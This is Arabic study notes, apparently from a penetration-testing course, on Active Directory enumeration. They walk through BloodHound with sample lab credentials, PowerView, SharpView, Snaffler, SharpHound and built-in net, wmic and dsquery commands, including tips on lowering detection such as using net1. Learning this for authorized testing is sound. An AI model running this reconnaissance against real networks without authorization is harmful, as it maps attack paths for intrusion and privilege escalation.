> اجمع أكبر مجموعة من البيانات المدعومة في collection configuration المستخدمة.

في المثال:

```bash
sudo bloodhound-python \
-u 'forend' \
-p 'Klmcargo2' \
-ns 172.16.5.5 \
-d inlanefreight.local \
-c all
```

---

## BloodHound Output

الـ output يقول:

```text
Found 1 domains
Found 2 domains in the forest
Found 564 computers
Found 2951 users
Found 183 groups
Found 2 trusts
```

وده مهم جداً.

أنت في command واحد عرفت حجم الـ environment تقريباً.

---

## يعني إيه Forest؟

في Active Directory:

```text
Forest
  ├── Domain A
  ├── Domain B
  └── Domain C
```

فالـ forest ممكن تحتوي على أكثر من domain.

في المثال:

```text
1 domain
2 domains in forest
```

يعني الـ environment أكبر من مجرد domain واحد.

---

## يعني إيه Trust؟

الـ trust هو relationship بين domains/forests تسمح بمستويات معينة من authentication/access relationships.

وجود:

```text
2 trusts
```

مهم لأن trust relationships ممكن توسع نطاق الـ attack-path analysis.

---

## ملفات BloodHound

بعد ما collector يخلص، هتلاقي files زي:

```text
*_computers.json
*_domains.json
*_groups.json
*_users.json
```

كل ملف يحتوي نوع مختلف من الـ collected data.

---

## Neo4j

BloodHound يستخدم graph database، والـ lab هنا بيستخدم:

```text
Neo4j
```

تقدر تشغلها مثلاً:

```bash
sudo neo4j start
```

---

## BloodHound GUI

بعد كده تفتح BloodHound وتعمل:

```text
Upload Data
```

وترفع الـ JSON files.

ممكن ترفعهم individually أو تعمل:

```bash
zip -r ilfreight_bh.zip *.json
```

وبعدين ترفع الـ ZIP.

---

## Analysis Tab

هنا القوة الحقيقية.

BloodHound عنده built-in queries.

مثلاً:

```text
Find Shortest Paths To Domain Admins
```

وده معناه:

> حاول تلاقي أقصر relationship path من nodes معينة إلى Domain Admins.

---

## Attack Path

مثلاً BloodHound ممكن يوريك حاجة بالشكل ده:

```text
Your User
   ↓
MemberOf
   ↓
Interesting Group
   ↓
AdminTo
   ↓
Computer
   ↓
HasSession
   ↓
Privileged User
```

أنت هنا مش بتخمن.

أنت عندك graph مبني على relationships موجودة فعلاً في الـ AD data.

---

## Cypher

BloodHound بيدعم custom queries باستخدام:

```text
Cypher
```

Cypher 
هي query language مرتبطة بالـ graph database.

يعني بدل الـ built-in queries فقط، تقدر تعمل queries custom حسب اللي عايز تبحث عنه.

مثلاً conceptually:

```text
Find users
that belong to privileged groups
and have sessions
on computers
```

وتخلي BloodHound يطلعلك العلاقات دي.

---

## الصورة الكبيرة للـ Module

لو عايز تحفظ الـ module كله كـ workflow، احفظه بالشكل ده:

```text
                Valid Domain Credentials
                         |
                         ↓
                ┌─────────────────┐
                │ Credentialed    │
                │ Enumeration     │
                └────────┬────────┘
                         |
          ┌──────────────┼──────────────┐
          ↓              ↓              ↓
        CME          SMBMap        rpcclient
          |              |              |
          ↓              ↓              ↓
       Users          Shares         RIDs
       Groups         Files          Users
       Sessions       Permissions    Objects
          |              |              |
          └──────────────┼──────────────┘
                         ↓
                    Windapsearch
                         |
                         ↓
               LDAP-based Enumeration
                         |
                  ┌──────┴──────┐
                  ↓             ↓
             Domain Admins   Privileged
                              Users
                  \             /
                   \           /
                    ↓         ↓
                     BloodHound.py
                           |
                           ↓
                    AD Graph Database
                           |
                           ↓
                    BloodHound GUI
                           |
                           ↓
                     Attack Paths
                           |
                           ↓
              Lateral Movement /
              Privilege Escalation
```

---

## أهم فرق بين الأدوات

|Tool|بتستخدمها في إيه؟|
|---|---|
|CME|SMB enumeration + users + groups + sessions + shares + modules|
|SMBMap|SMB shares + permissions + directory/file enumeration|
|rpcclient|MS-RPC enumeration + users/RIDs وغيرها|
|Impacket|Windows protocol interaction + remote execution وأدوات أخرى|
|psexec.py|Remote execution باستخدام Local Admin credentials|
|wmiexec.py|Remote command execution عبر WMI|
|Windapsearch|LDAP-based AD enumeration|
|BloodHound.py|Collect AD relationships/data|
|BloodHound GUI|Visualize relationships وattack paths|

---

## أهم حاجة تفهمها كـ Pentester

الموضوع كله مش:

> "أنا عرفت أستخدم 7 tools."

الموضوع الحقيقي هو إنك تبدأ تربط المعلومات ببعض.

مثلاً:

```text
1. لقيت user
        ↓
2. عرفت group membership
        ↓
3. اكتشفت إن group دي privileged
        ↓
4. عرفت جهاز عليه user privileged logged in
        ↓
5. اكتشفت إن عندك Local Admin على الجهاز
        ↓
6. BloodHound أكد relationship/path
```

كل معلومة لوحدها ممكن تكون مش خطيرة.

لكن لما تجمعهم:

```text
Identity
+
Groups
+
Privileges
+
Sessions
+
Machines
+
Shares
+
ACLs
+
Trusts
```

تقدر تبدأ تفهم **الـ attack surface الحقيقي للـ Active Directory**.

وده بالضبط السبب إن الـ module بدأ بـ credentialed enumeration وانتهى بـ BloodHound وattack paths.

---

## الخلاصة اللي تتحفظ

لو داخل AD Pentest ومعاك low-priv domain credentials، اسأل نفسك بالترتيب:

```text
مين الـ Users؟
        ↓
مين الـ Groups؟
        ↓
مين الـ Privileged Users؟
        ↓
مين عضو في إيه؟
        ↓
مين Logged In فين؟
        ↓
أنا عندي access على أنهي Hosts؟
        ↓
أنا أقدر أقرأ أنهي Shares؟
        ↓
فيه ملفات حساسة؟
        ↓
إيه الـ LDAP relationships؟
        ↓
إيه الـ ACLs / Sessions / Trusts؟
        ↓
BloodHound
        ↓
إيه أقصر Attack Path؟
```

**وده هو جوهر Credentialed Enumeration:** مش مجرد جمع data، لكن تحويل الـ data دي إلى **فهم للعلاقات والصلاحيات والـ attack paths داخل الـ AD**.


# Layer 15
## 1. الفكرة الأساسية: Enumeration من Windows

في الجزء اللي فات كان عندنا Linux attack host واستخدمنا أدوات زي:

`NetExec/CME → SMBMap → rpcclient → Windapsearch → BloodHound.py`

هنا نفس الفكرة، لكن الـ attack host بتاعنا **Windows**.

الأدوات الأساسية في الجزء ده:

- ActiveDirectory PowerShell Module
    
- PowerView
    
- SharpView
    
- Snaffler
    
- SharpHound + BloodHound
    
- بالإضافة لـ Windows built-in commands
    

الهدف مش إننا نلاقي ثغرة واحدة وخلاص. إحنا بنبني **صورة كاملة للـ Active Directory**: users، groups، trusts، shares، permissions، sessions، ACLs، SPNs، local admin access وغيرها. والـ enumeration ممكن ينتج عنه findings مفيدة للـ report حتى لو مش أدت مباشرة لـ privilege escalation.

---

## 2. ActiveDirectory PowerShell Module

أول حاجة مهمة:

Windows عنده 
PowerShell module اسمه:

```powershell
ActiveDirectory
```

وده عبارة عن مجموعة كبيرة من PowerShell cmdlets للتعامل مع Active Directory.

الملف بيذكر إن فيه **147 cmdlets** وقت كتابة المادة.

الفكرة الجميلة هنا إنك بدل ما تنزل tool زي PowerView، ممكن تستخدم الأدوات الموجودة أصلاً على Windows.

وده ممكن يكون أقل وضوحًا في بعض البيئات من إنك تدخل executable جديد على الجهاز، ودي نقطة الـ OPSEC اللي المادة بتشير لها.

---

## 3. الأول نشوف الـ Modules الموجودة

نفذ:

```powershell
Get-Module
```

ده بيوريك الـ modules اللي متاحة/loaded والـ commands اللي بتصدرها.

مثلاً:

```text
ModuleType Version Name
---------- ------- ----
Manifest   3.1.0.0 Microsoft.PowerShell.Utility
Script     2.0.0   PSReadline
```

هنا تلاحظ إن:

```text
ActiveDirectory
```

مش موجودة.

يبقى نحملها:

```powershell
Import-Module ActiveDirectory
```

وبعدين:

```powershell
Get-Module
```

دلوقتي المفروض تشوف:

```text
ActiveDirectory
```

وده بالضبط الـ workflow اللي المادة بتشرحه.

---

## 4. Get-ADDomain

أول enumeration حقيقي:

```powershell
Get-ADDomain
```

ده من أهم commands لأنك بتاخد منه **معلومات أساسية عن الـ domain**.

مثلاً في الـ output بتاع اللاب:

```text
DNSRoot       : INLANEFREIGHT.LOCAL
DomainSID     : S-1-5-21-...
Forest        : INLANEFREIGHT.LOCAL
DomainMode    : Windows2016Domain
PDCEmulator   : ACADEMY-EA-DC01...
RIDMaster     : ACADEMY-EA-DC01...
```

وكمان:

```text
ChildDomains : {LOGISTICS.INLANEFREIGHT.LOCAL}
```

يعني فيه child domain.

### أهم حاجات تبص عليها

#### DNSRoot

```text
INLANEFREIGHT.LOCAL
```

ده اسم الـ domain.

#### DomainSID

مثلاً:

```text
S-1-5-21-3842939050-3880317879-2865463114
```

ده الـ SID الأساسي للـ domain.

#### Forest

```text
INLANEFREIGHT.LOCAL
```

بيعرفك الـ forest اللي الـ domain موجود فيه.

#### ChildDomains

```text
LOGISTICS.INLANEFREIGHT.LOCAL
```

وده مهم جدًا لأن وجود child domains يفتحلك مجال تفكر في **trust relationships** والتنقل بين domains.

---

## 5. Get-ADUser والـ SPN

دلوقتي نبدأ ندور على users.

الأمر:

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

خلينا نفككه:

```text
Get-ADUser
```

هات AD users.

```text
-Filter
```

حددلي users بناءً على condition.

والـ condition:

```powershell
ServicePrincipalName -ne "$null"
```

يعني:

> هات الـ users اللي عندهم `ServicePrincipalName` متعيّن.

وفي الـ output مثلاً:

```text
Name              : adfs
SamAccountName    : adfs
ServicePrincipalName : {adfsconnect/azure01...}
```

وفي account تاني:

```text
Name              : BACKUPAGENT
SamAccountName    : backupagent
ServicePrincipalName : {backupjob/veam001...}
```

### ليه الـ SPN مهم؟

لأن الـ accounts اللي عليها SPNs ممكن تكون مرشحة لـ **Kerberoasting**.

يعني هنا إحنا لسه **بنenumerate**.

مش معنى إننا لقينا SPN إن الحساب vulnerable بشكل مؤكد.

لكن بنقول:

> الحساب ده interesting، خليه في الـ notes ونفحصه في مرحلة Kerberoasting.

وده بالضبط framing المادة.

---

## 6. Trust Enumeration

بعد كده:

```powershell
Get-ADTrust -Filter *
```

ده بيسألك:

> الـ domain ده عامل Trust مع مين؟

في المثال فيه:

```text
INLANEFREIGHT.LOCAL
        ↕
LOGISTICS.INLANEFREIGHT.LOCAL
```

و:

```text
INLANEFREIGHT.LOCAL
        ↕
FREIGHTLOGISTICS.LOCAL
```

وده مهم جدًا.

لأن AD environment ممكن يكون أكبر من الـ domain اللي إنت واقف فيه.

### أهم fields

#### Direction

```text
Bidirectional
```

يعني الـ trust في الاتجاهين.

#### IntraForest

```text
True
```

يعني trust داخل نفس الـ forest.

أما:

```text
IntraForest : False
ForestTransitive : True
```

فده في المثال الثاني يشير لـ forest trust.

المادة بتوضح إن معلومات الـ trusts هتبقى مهمة لاحقًا عند دراسة child-to-parent وcross-forest attack paths.

---

## 7. Group Enumeration

نعمل:

```powershell
Get-ADGroup -Filter * | select name
```

ده معناه:

```text
Get-ADGroup -Filter *
```

هات كل الـ groups.

وبعدين:

```powershell
| select name
```

خليلي الـ output يعرض الاسم بس.

فتشوف حاجات زي:

```text
Administrators
Backup Operators
Domain Admins
Enterprise Admins
Schema Admins
Remote Management Users
...
```

### ليه الـ groups أهم من مجرد users؟

لأن في AD الـ privilege غالبًا مش بيتحدد من الـ user نفسه فقط.

ممكن:

```text
User
 ↓
Group
 ↓
Privileged Group
 ↓
Privilege
```

فلازم تفهم membership.

---

## 8. Detailed Group Info

مثلاً لقينا:

```text
Backup Operators
```

نقدر نعمل:

```powershell
Get-ADGroup -Identity "Backup Operators"
```

هيطلعلك:

```text
GroupCategory : Security
GroupScope    : DomainLocal
Name          : Backup Operators
SID           : S-1-5-32-551
```

إحنا كده عرفنا الـ group نفسه.

لكن السؤال الأهم:

> مين جواه؟

---

## 9. Group Membership

```powershell
Get-ADGroupMember -Identity "Backup Operators"
```

النتيجة في اللاب:

```text
name          : BACKUPAGENT
SamAccountName: backupagent
objectClass   : user
```

وده interesting جدًا.

عندك:

```text
backupagent
      ↓
Backup Operators
```

فلو في assessment لقيت طريقة للسيطرة على `backupagent`، لازم تفتكر إن الحساب ده عنده membership مهمة.

المادة نفسها بتستخدم المثال ده لتوضيح إن membership دي ممكن تكون جزء من طريق يؤدي للسيطرة على الـ domain.

---

## 10. المشكلة: Manual Enumeration

هنا بيظهر عيب كبير.

لو عندك:

- 3,000 users
    
- 500 groups
    
- 500 computers
    
- nested groups
    
- trusts
    
- shares
    
- ACLs
    

وتبدأ تعمل:

```text
Get group
   ↓
Get members
   ↓
Get nested groups
   ↓
Get permissions
   ↓
Get computers
```

هتغرق في data.

وده السبب إن أدوات زي:

```text
PowerView
BloodHound
```

مهمة جدًا.

---

## 11. PowerView

PowerView عبارة عن PowerShell tool للـ AD reconnaissance.

المادة بتوصفه إنه يقدر يساعدك في:

- users
    
- computers
    
- groups
    
- ACLs
    
- trusts
    
- logged-in users
    
- shares
    
- passwords
    
- SPNs
    
- Kerberoasting
    

وغيرها.

الفكرة:

```text
ActiveDirectory Module
        ↓
Built-in enumeration

PowerView
        ↓
More flexible / deeper enumeration
```

---

## 12. أهم PowerView Commands

خلينا نفهمهم كـ categories بدل ما نحفظهم عشوائي.

### Domain

```powershell
Get-Domain
Get-DomainController
```

تعرف:

> الـ domain والـ DCs.

### Users

```powershell
Get-DomainUser
```

users.

### Computers

```powershell
Get-DomainComputer
```

machines.

### Groups

```powershell
Get-DomainGroup
Get-DomainGroupMember
```

groups + memberships.

### OUs

```powershell
Get-DomainOU
```

الـ Organizational Units.

### ACLs

```powershell
Find-InterestingDomainAcl
```

تدور على ACLs interesting.

### GPO

```powershell
Get-DomainGPO
Get-DomainPolicy
```

### Local enumeration

```powershell
Get-NetLocalGroup
Get-NetLocalGroupMember
Get-NetShare
Get-NetSession
```

### Admin access

```powershell
Test-AdminAccess
```

### Threaded / broad enumeration

```powershell
Find-DomainUserLocation
Find-DomainShare
Find-InterestingDomainShareFile
Find-LocalAdminAccess
```

### Trusts

```powershell
Get-DomainTrust
Get-ForestTrust
Get-DomainForeignUser
Get-DomainForeignGroupMember
Get-DomainTrustMapping
```

الـ table الموجودة في الملف بتجمع الوظائف دي وتصنفها حسب نوع الـ enumeration.

---

## 13. Get-DomainUser

مثلاً عايزين user معين:

```powershell
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local
```

ونقدر نختار properties معينة:

```powershell
| Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

هنا أنت بتعمل profiling للـ account.

مثلاً:

```text
name            : Matthew Morgan
samaccountname  : mmorgan
memberof        : {...}
pwdlastset      : ...
lastlogontimestamp : ...
admincount      : 1
userprincipalname : mmorgan@inlanefreight.local
serviceprincipalname :
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

### حاجات interesting

```text
admincount : 1
```

دي attribute مهمة جدًا في الـ AD enumeration.

وكمان:

```text
DONT_EXPIRE_PASSWORD
DONT_REQ_PREAUTH
```

خصائص تستحق إنك تاخد بالك منها وتعملها correlation مع باقي الـ data.

---

## 14. Nested Groups — من أخطر الحاجات

دي نقطة مهمة جدًا.

الأمر:

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

الـ:

```text
-Recurse
```

مهم جدًا.

ليه؟

لأن ممكن يكون عندك:

```text
Domain Admins
      ↓
Secadmins
      ↓
spong1990
```

يعني `spong1990` مش لازم يكون مكتوب مباشرة كعضو في Domain Admins.

هو ممكن يكون:

```text
User
 ↓
Group
 ↓
Group
 ↓
Domain Admins
```

وبالتالي يرث الـ privilege.

في المثال، الـ output بيظهر `Secadmins` كـ nested group داخل `Domain Admins`، وأعضاء المجموعة يرثوا صلاحيات Domain Admin.

### ودي واحدة من أهم أفكار AD enumeration

متبصش فقط:

```text
Who is Domain Admin?
```

بص:

```text
Who can become Domain Admin through membership?
```

---

## 15. Trust Mapping باستخدام PowerView

```powershell
Get-DomainTrustMapping
```

ده أوسع شوية لأنه بيحاول يرسم الـ trust relationships اللي شايفها.

في المثال:

```text
INLANEFREIGHT.LOCAL
        ↕
LOGISTICS.INLANEFREIGHT.LOCAL
```

و:

```text
INLANEFREIGHT.LOCAL
        ↕
FREIGHTLOGISTICS.LOCAL
```

وده بيخليك تبدأ تفكر في الـ environment كـ:

```text
Forest
 ├── Domain A
 │
 ├── Child Domain
 │
 └── External Forest
```

مش مجرد جهاز واحد أو domain واحد.

---

### 16. Test-AdminAccess

دلوقتي سؤال مهم جدًا:

> الحساب بتاعي Admin على أنهي machines؟

PowerView:

```powershell
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

النتيجة:

```text
ComputerName       IsAdmin
------------       -------
ACADEMY-EA-MS01    True
```

يعني:

```text
Current User
      ↓
Local Administrator
      ↓
ACADEMY-EA-MS01
```

وده مهم جدًا في **lateral movement mapping**.

---

## 17. Finding SPNs مرة تانية

PowerView يوفر طريقة أبسط:

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

فتشوف:

```text
adfsconnect/...       adfs
backupjob/...          backupagent
MSSQLSvc/...           sqldev
MSSQLSvc/...           sqlprod
...
```

ودي accounts محتملة للاهتمام في مرحلة Kerberoasting.

---

## 18. SharpView

PowerView أساسه PowerShell.

لكن أحيانًا البيئة تكون hardened ضد استخدام PowerShell.

هنا يأتي:

```text
SharpView
```

وهو **.NET port of PowerView**.

يعني نفس الفكرة تقريبًا لكن executable مبني بـ .NET.

مثلاً:

```powershell
.\SharpView.exe Get-DomainUser -Help
```

هيعرضلك arguments الخاصة بالـ function.

وبعدين:

```powershell
.\SharpView.exe Get-DomainUser -Identity forend
```

يقدر يطلع معلومات المستخدم والـ LDAP search اللي حصل.

الفكرة مش إن SharpView "أقوى" بشكل سحري.

الفكرة:

```text
PowerView
   ↓
PowerShell-based

SharpView
   ↓
.NET-based
```

وده بيديك alternative حسب قيود البيئة.

---

## 19. Shares

دي من أهم أجزاء الـ enumeration.

الـ shares ممكن تحتوي على:

```text
passwords
configuration files
SSH keys
authentication files
scripts
backup files
sensitive documents
```

خصوصًا:

```text
IT
Infrastructure
Development
HR
Finance
```

المشكلة هنا ممكن تكون:

```text
Low-privileged user
       ↓
Readable Share
       ↓
Sensitive File
       ↓
Credential
       ↓
Higher Privilege
```

المادة بتوضح إن overly permissive shares ممكن تسبب disclosure لبيانات حساسة، خصوصًا HR والـ medical/legal وغيرها.

---

## 20. Snaffler

بدل ما تعمل hunting يدوي على مئات الـ shares، عندك:

```text
Snaffler
```

وظيفته باختصار:

```text
Domain
 ↓
Hosts
 ↓
Shares
 ↓
Readable directories
 ↓
Files
 ↓
Interesting / sensitive files
```

والمادة بتذكر إنه يحتاج تشغيله من domain-joined host أو domain-user context.

الأمر:

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

نفككه:

```text
-s
```

اطبع النتائج على الشاشة.

```text
-d inlanefreight.local
```

حدد الـ domain.

```text
-o snaffler.log
```

احفظ output في logfile.

```text
-v data
```

حدد مستوى الـ verbosity.

---

## 21. Snaffler Output

في المثال بيلاقي shares:

```text
Department Shares
User Shares
ZZZ_archive
```

وبعدين ملفات interesting:

```text
GroupBackup.kdb
ShowReset.key
WriteUse.kwallet
ProtectStep.key
StopTrace.ppk
...
```

وكمان:

```text
.sqldump
.mdf
.key
.ppk
.keychain
.psafe3
```

### هنا ركز

Snaffler مش بيقولك:

> "دي credentials مؤكدة."

هو بيقول:

> "الملف ده يستحق التحقيق."

مثلاً:

```text
.ppk
```

ممكن يكون SSH private key.

```text
.kdb
```

ممكن يكون KeePass database.

```text
.psafe3
```

ممكن يكون Password Safe database.

لكن **لازم تفحص المحتوى والسياق** قبل ما تستنتج إن فيه credential فعلي.

---

## 22. BloodHound

وهنا بنوصل لأهم tool في الـ section.

المشكلة عندنا بقت:

```text
Users
Groups
Computers
Sessions
Shares
ACLs
GPOs
SPNs
Trusts
Local Admin
RDP
WinRM
...
```

الـ data كتير جدًا.

BloodHound يحول العلاقات دي إلى **graph**.

بدل:

```text
1000 lines of output
```

تشوف:

```text
User
 ↓
Group
 ↓
Computer
 ↓
Session
 ↓
Privileged User
```

وتبدأ تشوف الـ attack paths.

المادة بتصف BloodHound بأنه قادر على تحديد attack paths عن طريق تحليل العلاقات بين objects.

---

## 23. SharpHound

من Windows، الـ collector هو:

```text
SharpHound.exe
```

مثلاً:

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

معناها:

```text
-c All
```

اجمع كل collection methods المطلوبة.

و:

```text
--zipfilename ILFREIGHT
```

سمّي ملف الـ output بهذا الاسم.

---

## 24. SharpHound بيجمع إيه؟

من الـ help:

```text
Group
LocalAdmin
GPOLocalGroup
Session
LoggedOn
Trusts
ACL
Container
RDP
ObjectProps
DCOM
...
```

يعني بيجمع علاقات ومعلومات عن:

- group membership
    
- local admin
    
- sessions
    
- logged-on users
    
- trusts
    
- ACLs
    
- GPO-related relationships
    
- RDP
    
- DCOM
    
- properties
    

---

## 25. بعد الـ Collection

SharpHound ينتج dataset.

بعد كده تدخله في:

```text
BloodHound GUI
```

في المثال المادة بتستخدم:

```text
Upload Data
```

وتختار الـ `.zip` الناتج.

بعد الـ ingestion تبدأ مرحلة التحليل.

---

## 26. BloodHound مش بس للـ Attack Paths

دي نقطة مهمة جدًا.

المادة بتوضح إن BloodHound ممكن يساعدك في findings دفاعية كمان.

مثلاً:

```text
Find Computers with Unsupported Operating Systems
```

ممكن تكتشف:

```text
Windows 7
Windows Server 2008
```

لكن قبل ما تكتب finding لازم تتأكد إن الجهاز فعلًا live، لأن ممكن يكون مجرد record قديم في AD.

---

## 27. Local Admin Query

Query مهمة:

```text
Find Computers where Domain Users are Local Admin
```

لو لقيت:

```text
DOMAIN USERS
      ↓
Local Admin
      ↓
Machine
```

فده misconfiguration خطير.

لأن أي account تحت Domain Users ممكن، حسب باقي الظروف، يكون عنده local admin access على الجهاز.

والمادة بتشير إن ده ممكن يسمح بعد ذلك بالوصول لمعلومات حساسة أو credentials على تلك الأجهزة.

---

## 28. الصورة الكبيرة للـ Section كله

لو عايز تحفظ الـ workflow، متحفظش 50 command.

احفظ الـ logic ده:

```text
          VALID DOMAIN CREDS
                  │
                  ▼
        ┌───────────────────┐
        │ Domain Enumeration│
        └─────────┬─────────┘
                  │
       ┌──────────┼──────────┐
       ▼          ▼          ▼
     Users      Groups      Computers
       │          │          │
       ▼          ▼          ▼
     SPNs      Membership   Sessions
       │          │          │
       ▼          ▼          ▼
 Kerberoast   Privilege    Local Admin
 Candidates     Paths         Access
       │          │          │
       └──────────┼──────────┘
                  ▼
              Shares
                  │
                  ▼
        Sensitive Files/Secrets
                  │
                  ▼
               Trusts
                  │
                  ▼
          Other Domains/Forests
                  │
                  ▼
             BloodHound
                  │
                  ▼
            ATTACK PATHS
```

والأدوات بتتقسم تقريبًا كده:

|الهدف|Tool|
|---|---|
|Basic AD enumeration|ActiveDirectory PowerShell|
|Flexible AD recon|PowerView|
|PowerView بدون الاعتماد على PowerShell|SharpView|
|Hunt sensitive files/shares|Snaffler|
|Collect AD relationships|SharpHound|
|Visualize/correlate relationships|BloodHound|

---

## 29. الفرق بين الجزء اللي فات والجزء ده

وده مهم جدًا بالنسبة لك في الـ pentesting:

```text
Linux Attack Host
       │
       ├── NetExec
       ├── SMBMap
       ├── rpcclient
       ├── Windapsearch
       └── BloodHound.py
```

مقابل:

```text
Windows Attack Host
       │
       ├── ActiveDirectory Module
       ├── PowerView
       ├── SharpView
       ├── Snaffler
       └── SharpHound
              │
              ▼
          BloodHound
```

**الـ objective واحد تقريبًا، لكن الأدوات والـ execution environment مختلفين.**

وأهم skill هنا مش إنك تعرف:

```powershell
Get-DomainUser
```

لكن إنك تشوف:

```text
User
 ↓
Group
 ↓
Privilege
 ↓
Computer
 ↓
Session
 ↓
Credential
 ↓
Another Account
 ↓
Another Privilege
```

وتقدر تحول الـ enumeration data دي إلى **قصة attack path منطقية**.

وفي آخر الجزء، المادة بتجهزك للسؤال المهم: ماذا لو عندك shell محدود وممنوع تنزل tools أو تعمل import؟ وهنا الانتقال بيكون إلى **Living Off The Land**.



# Layer 16


> بدل ما تنزل SharpHound / PowerView / Snaffler على الجهاز، تستخدم الأدوات الموجودة أصلًا في Windows وAD.

وده مهم جدًا في الـPentest لأن البيئة ممكن تكون **managed host + مفيش Internet + ممنوع/فشل تحميل tools**، وكمان تحميل أدوات خارجية ممكن يرفع احتمالية اكتشافك.

---

## 1. أول حاجة: اعرف أنت على إيه

### `hostname`

```powershell
hostname
```

بيجيب اسم الجهاز.

مثلاً:

```text
ACADEMY-EA-MS01
```

---

### إصدار Windows

```powershell
[System.Environment]::OSVersion.Version
```

يعني تعرف الـOS version والـrevision.

---

### الـPatches

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

ده يوريك الـhotfixes والـpatches المثبتة.

مفيد جدًا لأنك بتعرف:

- الجهاز محدث ولا لأ
    
- فيه patches ناقصة؟
    
- هل فيه software/version قديم؟
    

---

## 2. اعرف الـNetwork بتاع الجهاز

### `ipconfig /all`

```cmd
ipconfig /all
```

منه تعرف:

- IP
    
- DNS
    
- Gateway
    
- Network adapter
    
- DHCP
    
- Domain-related configuration
    

---

### اعرف الـDomain

من CMD:

```cmd
echo %USERDOMAIN%
```

مثلاً:

```text
INLANEFREIGHT
```

وده اسم الـdomain اللي الجهاز تابع ليه.

---

### اعرف الـDomain Controller

```cmd
echo %logonserver%
```

مثلاً:

```text
\\ACADEMY-EA-DC01
```

يعني الجهاز بيتعامل مع الـDC ده.

---

## 3. بدل كل ده ممكن تستخدم `systeminfo`

```cmd
systeminfo
```

دي بتجمعلك معلومات كتير عن الجهاز في output واحد.

HTB بيذكر إن استخدام command واحد ممكن ينتج logs أقل من تشغيل commands كتير منفصلة، لكن طبعًا ده **مش معناه إنه غير مراقب**.

---

## 4. PowerShell مهم جدًا

شوف الـmodules الموجودة:

```powershell
Get-Module
```

مثلاً ممكن تلاقي:

```text
ActiveDirectory
Microsoft.PowerShell.Utility
PSReadline
```

`Get-Module` هنا بيساعدك تعرف إيه المتاح على الجهاز بالفعل.



---

## 5. Environment Variables

```powershell
Get-ChildItem Env: | ft Key,Value
```

دي بتعرض environment variables.

ممكن تلاقي حاجات زي:

```text
COMPUTERNAME
USERDOMAIN
USERNAME
USERPROFILE
PATH
PSModulePath
```

مثلاً:

```text
COMPUTERNAME = ACADEMY-EA-MS01
USERDOMAIN   = INLANEFREIGHT
USERNAME     = ACADEMY-EA-MS01$
```

### ليه ده مهم؟

لأنك بتبني صورة سريعة:

```text
مين أنا؟
        ↓
أنا على أنهي جهاز؟
        ↓
الجهاز تابع لأنهي Domain؟
        ↓
إيه الـPATH والـModules المتاحة؟
```

---

## 6. `qwinsta` — هل أنا لوحدي؟

دي مهمة جدًا.

```cmd
qwinsta
```

ممكن تشوف:

```text
SESSIONNAME    USERNAME    ID    STATE
console        forend      1     Active
```

معناها إن فيه user اسمه `forend` عامل interactive session على الجهاز.

ليه يهمك؟

لأنك لو بتعمل assessment من جهاز شخص تاني، وجوده على نفس الجهاز ممكن يكون operational concern.

---

## 7. `arp -a`

```cmd
arp -a
```

دي بتعرض الأجهزة اللي الجهاز الحالي عنده ARP entries ليها.

مثلاً:

```text
172.16.5.5
172.16.5.130
172.16.5.240
```

مش معناها إن دي كل الأجهزة الموجودة في الشبكة.

لكن معناها:

> الأجهزة دي ظهرت للـhost الحالي على Layer 2/ARP.

وده ممكن يساعدك تكتشف network neighbors.

---

## 8. `route print`

```cmd
route print
```

دي من أهم الحاجات.

بتقولك:

**الجهاز ده عارف يوصل لأنهي networks؟**

مثلاً في اللاب:

```text
10.129.0.0/16
172.16.4.0/23
```

لو لقيت network مش موجودة في الـnetwork segment اللي أنت فاكره، دي تستحق investigation.

HTB بيشير إن routing information ممكن تكشف network segments إضافية وقد تكون مهمة في الـpivoting.

---

## 9. WMI

WMI = **Windows Management Instrumentation**

فكر فيه كـframework بيسمحلك تستعلم عن Windows والـdomain information.

مثلاً:

```cmd
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
```

أو:

```cmd
wmic process list /format:list
```

أو:

```cmd
wmic useraccount list /format:list
```

أو:

```cmd
wmic group list /format:list
```

أو:

```cmd
wmic ntdomain list /format:list
```

الـ`wmic ntdomain` بالذات ممكن يوريك معلومات عن الـdomain والـDCs.

---

## 10. Net Commands

دي من أهم أجزاء الـmodule.

مثلاً:

### كل Domain Users

```cmd
net user /domain
```

### معلومات User معين

```cmd
net user wrouse /domain
```

### كل Domain Groups

```cmd
net group /domain
```

### أعضاء Domain Admins

```cmd
net group "Domain Admins" /domain
```

### أجهزة الـDomain

```cmd
net group "domain computers" /domain
```

### Domain Controllers

```cmd
net group "Domain Controllers" /domain
```

### Password Policy

```cmd
net accounts /domain
```

### Shares

```cmd
net view /all /domain
```

الـmodule بيجمع مجموعة كبيرة من الـ`net` commands للـusers/groups/computers/DCs/password policy/shares.

---

## 11. نقطة مهمة جدًا: `net1`

الـmodule بيشرح إن:

```cmd
net1
```

بينفذ نفس وظائف `net`، وبيُذكر كطريقة لتجنب بعض الـdetections المبنية بشكل ساذج على string `net`.

لكن خلي بالك:

**ده مش bypass سحري للـEDR.**

لو الـEDR بيراقب process behavior أو command execution بشكل كويس، تغيير `net` إلى `net1` مش هيخليك invisible.

---

## 12. Dsquery

وده من أهم الأدوات في الجزء ده.

```cmd
dsquery user
```

يجيب الـAD users.

مثلاً:

```text
CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
...
```

والـcomputer:

```cmd
dsquery computer
```

يجيب أجهزة الـDomain.

---

## 13. LDAP Filters

هنا الجزء اللي لازم تفهمه كويس، مش تحفظه.

مثلاً:

```text
userAccountControl:1.2.840.113556.1.4.803:=8192
```

معناه إنك بتعمل LDAP matching على `userAccountControl` باستخدام bitmask.

الـ`8192` في المثال بتستخدم للبحث عن Domain Controllers.

يعني:

```cmd
